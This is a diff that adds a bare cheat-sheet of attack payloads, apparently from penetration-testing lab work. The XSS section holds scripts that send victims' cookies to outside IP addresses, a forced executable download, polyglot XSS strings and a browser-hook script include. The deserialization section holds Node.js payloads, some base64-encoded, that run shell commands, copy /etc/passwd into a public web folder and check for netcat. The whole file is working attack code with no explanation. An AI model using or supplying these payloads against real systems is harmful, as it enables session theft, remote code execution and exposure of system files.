@@ -1,0 +1,37 @@
+-----------------------------------------------------------
+XSS attacks
+
+<script>document.write('img src="http://10.10.1.6/pippo.php?cookie='%2B document.cookie %2B'" />');</script>
+<script>new Image().src="http://10.11.0.197/pippo.php?output="+document.cookie;</script>
+
+<script>var link=document.createElement('a') link.href='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download=document.body.appendChild(link); link.click();</script>
+
+http://www.xss-payloads.com/payloads-list.html?c#category=capture
+
+<form id="test"></form><button form="test" formaction="javascript:new Image().src='http://10.10.1.6/pippo.php?output='+document.cookie;">X</button>
+
+<form id="test"></form><button form="test" formaction="javascript:document.cookie">X</button>
+
+<scRipt/--!>/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</script/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e ">
+
+<script src="http://10.10.1.6:3000/hook.js"></script>
+
+
+<script src="http://10.10.1.6:3000/hook.js"></script>
+
+-------------------------------------------------------------
+Deserialization attacks
+
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('DO SOMETHING HERE', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('echo node deserialization is awesome >> /opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRpb24gaXMgYXdlc29tZSA+PiAvb3B0L3dlYi9jaGF0U3VwcG9ydFN5c3RlbXMvcHVibGljL2hhY2tlZC50eHQnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQo=
+
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('cat /etc/passwd >> /opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2NhdCAvZXRjL3Bhc3N3ZCA+PiAvb3B0L3dlYi9jaGF0U3VwcG9ydFN5c3RlbXMvcHVibGljL2hhY2tlZC50eHQnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==
+
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('which nc >> /opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}
